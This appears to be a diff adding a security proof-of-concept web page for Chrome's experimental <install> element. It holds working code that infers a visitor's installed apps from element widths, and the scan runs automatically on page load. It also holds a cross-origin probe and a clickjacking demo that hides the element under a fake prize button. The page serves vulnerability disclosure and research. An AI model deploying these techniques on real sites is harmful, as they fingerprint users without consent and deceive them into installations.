@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web App Install Vulnerabilities</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+            background-color: #f4f4f9;
+        }
+        h1 {
+            color: #333;
+        }
+        .explanation {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .warning {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        #results {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .app-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .app-name {
+            font-weight: 500;
+        }
+        .app-status {
+            font-family: monospace;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+        .status-installed {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+        }
+        .status-not-installed {
+            background-color: #ffebee;
+            color: #c62828;
+        }
+        .status-unknown {
+            background-color: #f5f5f5;
+            color: #616161;
+        }
+        .demo-box {
+            background: #f8f9fa;
+            border: 1px dashed #ccc;
+            padding: 15px;
+            margin-top: 10px;
+            border-radius: 4px;
+        }
+        .example-btn {
+            background: none;
+            border: none;
+            color: #007bff;
+            text-decoration: underline;
+            cursor: pointer;
+            padding: 0;
+            margin-right: 12px;
+            font-size: 0.9em;
+        }
+        /* Hide the install elements but keep them rendered for layout */
+        #hidden-container {
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+            visibility: hidden;
+        }
+        /* Ensure the element has a layout */
+        install {
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Web App Install Vulnerabilities</h1>
+
+    <div class="explanation">
+        <h2>What is this?</h2>
+        <p>This Proof of Concept (POC) demonstrates several security and privacy issues introduced by the experimental <code>&lt;install&gt;</code> HTML element.</p>
+        <p>
+            The <code>&lt;install&gt;</code> element is a new web platform feature designed to provide a native, standard UI for installing Web Apps directly from a website. While it aims to improve user experience, the current implementation exposes several side-channels and vectors for abuse.
+        </p>
+        <p>
+            <span class="warning">Requirements:</span> This feature is experimental. To see it in action, you must run Chrome with the following flag:
+            <br>
+            <code>--enable-features=InstallElement</code>
+        </p>
+        <p>
+            <strong>Status:</strong> These issues are currently reproducible as of <strong>Tuesday, February 17, 2026</strong> on <code>google-chrome-unstable</code>.
+        </p>
+    </div>
+
+    <div class="explanation">
+        <h2>1. Installation Status Leak (The Main Issue)</h2>
+        <p>
+            The <code>&lt;install&gt;</code> element's visual appearance (specifically its dimensions) changes depending on whether the target application is <strong>already installed</strong> or <strong>not installed</strong> on the user's device.
+        </p>
+        <p>
+            Typically, it displays "Install" (shorter text) or "Launch" (longer text) - or vice versa depending on localization and branding.
+            <br>
+            <span class="warning">The Side-Channel:</span> By creating an <code>&lt;install&gt;</code> element for a target URL and measuring its width (<code>offsetWidth</code>), a malicious website can infer if you have that application installed, effectively allowing them to "list" your installed applications without your permission.
+        </p>
+        <div class="demo-box">
+            <button id="start-btn" style="padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px;">Run Status Scan Demo</button>
+            <div id="results" style="margin-top: 10px;">
+                <div id="app-list">Click button to begin scan.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="explanation">
+        <h2>2. Event Explorer</h2>
+        <p>
+            The <code>invalidReason</code> attribute and error events can expose why an installation failed. 
+        </p>
+        <p>
+            <strong>Note:</strong> It is currently unclear if this behavior can be reliably abused to leak sensitive information, but it remains an interesting area for security research. In theory, distinguishing between a "404 Not Found" (Fetch Error) and a "200 OK" (Parser Error) could reveal the existence of private resources cross-origin without CORS.
+        </p>
+        <div class="demo-box">
+            <input type="text" id="xsleak-url" placeholder="Enter URL (e.g. https://google.com/)" style="width: 60%; padding: 8px;">
+            <button id="xsleak-create-btn" style="padding: 8px 15px; cursor: pointer;">Create Probe</button>
+            <button id="xsleak-read-btn" style="padding: 8px 15px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 4px;">Read Status</button>
+            
+            <div style="margin-top: 10px;">
+                <small>Try these (Manifest Examples):</small><br>
+                <button class="example-btn" data-url="https://www.youtube.com/">YouTube</button>
+                <button class="example-btn" data-url="https://www.instagram.com/">Instagram</button>
+                <button class="example-btn" data-url="https://x.com/">X (Twitter)</button>
+                <button class="example-btn" data-url="https://domain.does.not.exist.test/">Network Error</button>
+            </div>
+            
+            <div id="xsleak-container" style="margin-top: 15px; padding: 10px; border: 1px solid #ddd; min-height: 50px; display: flex; align-items: center; justify-content: center; background: #fff;">
+                <span style="color: #999;">Element will appear here...</span>
+            </div>
+            
+            <p id="xsleak-result" style="margin-top: 10px; font-family: monospace; background: #eee; padding: 10px; border-radius: 4px; white-space: pre-wrap;"></p>
+        </div>
+    </div>
+
+    <div class="explanation">
+        <h2>3. Context Spoofing & Phishing</h2>
+        <p>
+            Legitimate <code>&lt;install&gt;</code> elements can be disguised within a malicious context to trick users into initiating an installation. 
+        </p>
+        <p>
+            <strong>Mitigation:</strong> This is generally not considered a vulnerability as long as the browser displays a native installation prompt that is sufficiently clear and useful. If the prompt explicitly shows the app name, icon, and origin, the user can theoretically catch the deception before confirming the install.
+        </p>
+        <div class="demo-box" style="text-align: center; border: 2px solid #ff4444;">
+            <div style="background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
+                <h2 style="color: #ff4444; margin-top: 0;">🎁 CONGRATULATIONS! 🎁</h2>
+                <p>You have won a free iPhone 17 Pro Max! Click below to claim your prize instantly!</p>
+                <div style="position: relative; display: inline-block;">
+                    <install installurl="https://www.youtube.com/" style="opacity: 0.1; position: absolute; width: 100%; height: 100%; cursor: pointer;"></install>
+                    <button style="padding: 15px 30px; font-size: 20px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; pointer-events: none;">CLAIM MY PRIZE NOW</button>
+                </div>
+                <p style="font-size: 12px; color: #666; margin-top: 10px;">*The green button is just a visual; the invisible &lt;install&gt; element is on top of it.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Container for the install elements -->
+    <div id="hidden-container"></div>
+
+    <script>
+        const startBtn = document.getElementById('start-btn');
+        const appList = document.getElementById('app-list');
+        const hiddenContainer = document.getElementById('hidden-container');
+
+        async function fetchApps() {
+            try {
+                const response = await fetch('apps.json');
+                return await response.json();
+            } catch (error) {
+                console.error('Error fetching apps.json:', error);
+                return [];
+            }
+        }
+
+        async function runScan() {
+            appList.innerHTML = 'Scanning...';
+            startBtn.disabled = true;
+            
+            const apps = await fetchApps();
+            if (apps.length === 0) {
+                appList.innerHTML = 'No apps found in apps.json';
+                startBtn.disabled = false;
+                return;
+            }
+
+            appList.innerHTML = '';
+            const appElements = new Map();
+
+            for (const app of apps) {
+                const el = document.createElement('install');
+                el.setAttribute('installurl', app.url);
+                hiddenContainer.appendChild(el);
+                appElements.set(app, el);
+            }
+
+            await new Promise(resolve => requestAnimationFrame(() => setTimeout(resolve, 500)));
+
+            const results = [];
+            const widthCounts = {};
+
+            for (const [app, el] of appElements) {
+                const width = el.offsetWidth;
+                results.push({ app, width });
+                widthCounts[width] = (widthCounts[width] || 0) + 1;
+            }
+
+            let baselineWidth = -1;
+            let maxCount = -1;
+            for (const [w, count] of Object.entries(widthCounts)) {
+                if (count > maxCount) {
+                    maxCount = count;
+                    baselineWidth = parseInt(w);
+                }
+            }
+
+            appList.innerHTML = '';
+            for (const res of results) {
+                const row = document.createElement('div');
+                row.className = 'app-row';
+
+                const nameLink = document.createElement('a');
+                nameLink.className = 'app-name';
+                nameLink.textContent = res.app.name;
+                nameLink.href = res.app.url;
+                nameLink.target = '_blank';
+                nameLink.style.textDecoration = 'none';
+                nameLink.style.color = '#333';
+                nameLink.style.marginRight = '10px';
+
+                const leftGroup = document.createElement('div');
+                leftGroup.style.display = 'flex';
+                leftGroup.style.alignItems = 'center';
+                leftGroup.appendChild(nameLink);
+
+                const statusSpan = document.createElement('span');
+                statusSpan.className = 'app-status';
+                
+                let statusText = 'Unknown';
+                let statusClass = 'status-unknown';
+
+                if (res.width === 0) {
+                     statusText = 'Not a PWA';
+                     statusClass = 'status-unknown';
+                } else if (res.width === baselineWidth) {
+                    statusText = 'Not Installed';
+                    statusClass = 'status-not-installed';
+                } else {
+                    statusText = 'Installed';
+                    statusClass = 'status-installed';
+                }
+
+                statusSpan.classList.add(statusClass);
+                statusSpan.innerHTML = `${statusText} <small>(${res.width}px)</small>`;
+
+                row.appendChild(leftGroup);
+                row.appendChild(statusSpan);
+                appList.appendChild(row);
+            }
+
+            hiddenContainer.innerHTML = '';
+            startBtn.disabled = false;
+        }
+
+        startBtn.addEventListener('click', runScan);
+        
+        // Demo 2: XS-Leak Probe (Refactored)
+        let xsLeakElement = null;
+        const xsLeakContainer = document.getElementById('xsleak-container');
+
+        document.getElementById('xsleak-create-btn').addEventListener('click', () => {
+            const url = document.getElementById('xsleak-url').value || 'https://www.google.com/';
+            const resultEl = document.getElementById('xsleak-result');
+            
+            // Cleanup previous
+            xsLeakContainer.innerHTML = '';
+            resultEl.textContent = 'Creating element... waiting for events.\n';
+            
+            // Create new element
+            const el = document.createElement('install');
+            el.setAttribute('installurl', url);
+            el.style.border = '1px solid blue'; // Visual aid
+            
+            // Add Event Listeners based on the snippet
+            const logEvent = (name, event) => {
+                const target = event.target;
+                const log = `[${name}] valid: ${target.isValid}, reason: ${target.invalidReason}\n`;
+                resultEl.textContent += log;
+                console.log(name, event);
+            };
+
+            if ('HTMLInstallElement' in window) {
+                el.addEventListener('validationstatuschange', (e) => logEvent('validationstatuschange', e));
+                el.addEventListener('promptaction', (e) => logEvent('promptaction', e));
+                el.addEventListener('promptdismiss', (e) => logEvent('promptdismiss', e));
+            } else {
+                resultEl.textContent += 'Warning: HTMLInstallElement API not detected.\n';
+            }
+
+            xsLeakContainer.appendChild(el);
+            xsLeakElement = el;
+        });
+
+        document.getElementById('xsleak-read-btn').addEventListener('click', async () => {
+            if (!xsLeakElement) {
+                document.getElementById('xsleak-result').textContent = 'No element created yet.';
+                return;
+            }
+            
+            // Calculate baseline for heuristic
+            const dummyEl = document.createElement('install');
+            dummyEl.setAttribute('installurl', 'https://example.com/non-existent-pwa-' + Math.random());
+            hiddenContainer.appendChild(dummyEl);
+            await new Promise(r => setTimeout(r, 500));
+            const baseline = dummyEl.offsetWidth;
+            hiddenContainer.removeChild(dummyEl);
+
+            const width = xsLeakElement.offsetWidth;
+            let heuristic = 'Unknown';
+            if (width === 0) {
+                heuristic = 'Not a PWA (Error/Missing Manifest)';
+            } else if (width === baseline) {
+                heuristic = 'Detected: Not Installed';
+            } else {
+                heuristic = 'Detected: INSTALLED (Privacy Leak!)';
+            }
+
+            const info = {
+                heuristicResult: heuristic,
+                installurl: xsLeakElement.getAttribute('installurl'),
+                isValid: xsLeakElement.isValid, // Captured from new API
+                invalidReason: xsLeakElement.invalidReason || null,
+                offsetWidth: width,
+                baselineWidth: baseline,
+                isMatch: width === baseline
+            };
+            
+            // Append the JSON to the log
+            const currentLog = document.getElementById('xsleak-result').textContent;
+            document.getElementById('xsleak-result').textContent = currentLog + '\n-- Current State --\n' + JSON.stringify(info, null, 2);
+        });
+
+        // Example buttons for XS-Leak
+        document.querySelectorAll('.example-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                let url = btn.dataset.url;
+                if (url.startsWith('/')) {
+                    // Resolve relative path to absolute URL
+                    url = new URL(url, window.location.href).href;
+                }
+                document.getElementById('xsleak-url').value = url;
+                document.getElementById('xsleak-create-btn').click(); // Auto-create
+            });
+        });
+
+        runScan();
+    </script>
+</body>
+</html>
